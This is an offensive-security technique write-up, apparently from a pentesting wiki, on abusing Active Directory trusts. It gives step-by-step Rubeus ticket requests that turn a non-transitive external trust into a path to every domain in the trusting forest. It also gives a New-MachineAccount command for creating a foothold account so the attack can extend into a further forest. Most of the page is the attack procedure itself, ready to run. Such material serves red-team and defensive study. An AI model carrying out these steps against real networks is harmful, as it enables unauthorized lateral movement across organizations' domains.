# Transit across non-transitive trusts

If a non-transitive trust is setup between domains from two different forests (domain A and B for example), users from domain A will be able to access resources in domain B (in case that B trusts A), but will not be able to access resources in other domains that trust domain B (for example, domain C). Non-transitive trusts are setup by default on External Trusts for example.

However, there is a way to make non-transitive trusts transitive.

For this example, there is an External Trust between domains A and B (which are in different forests), there is a Within Forest trust between domains B and C (which are in the same forest), and a Parent-child trust between domains C and D (so, they are in the same forest). We have a user (userA) in domain A, and we want to access services in domain D, which is normally impossible since External Trusts are non-transitive.

### 1) First, obtain a TGT for userA in his domain A

    ./Rubeus.exe asktgt /user:userA /password:password /nowrap

### 2) Then, request a referral for the domain B with the previously obtained TGT (for the moment, everything is normal). This referral can be used to access resources in domain B as userA

    ./Rubeus.exe asktgs /service:krbtgt/domainB.local /ticket:<previous_TGT> /dc:dc.domainA.local /nowrap

### 3) With this referral, it is not possible to request for a ST in domain C since there is no transitivity. However, it is possible to use it to ask for a "local" TGT in domain B for userA. This will be a valid TGT in domain B and not a referral between A and B

    ./Rubeus.exe asktgs /service:krbtgt/domainB.local /targetdomain:domainB.local /ticket:<previous_referral> /dc:dc.domainB.local /nowrap

### 4) Now, this TGT can be reused to ask for a referral to access domain C, still from domain A with user A

    ./Rubeus.exe asktgs /service:krbtgt/domainC.local /targetdomain:domainB.local /ticket:<previous_local_TGT> /dc:dc.domainB.local /nowrap

This referral for domain C can be, in turn, used to access domain D with the same technique, and so on. This attack permits to pivot between all the trusts (and consequently the domains) in the same forest from a domain in a external forest.

However, it is not possible to directly use this technique to access a domain in another forest that would have a trust with domain D. For example, if domain D has an External Trust with domain E in a third forest, it will be not possible to access domain E from A.

A valid workaround is to use the referral for domain D to request a ST for LDAP in domain D, and use it to create a machine account. This account will be valid in domain D and will be used to restart the attack from domain D (like with user A) and access domain E.

    ./Rubeus.exe asktgs /service:ldap/domainD.local /ticket:<referral_domainD> /dc:dc.domainD.local /ptt
    New-MachineAccount -MachineAccount machineDomainD -Domain domainD.local -DomainController dc.domainD.local

#### Then, ask for a TGT and replay the attack against domain E
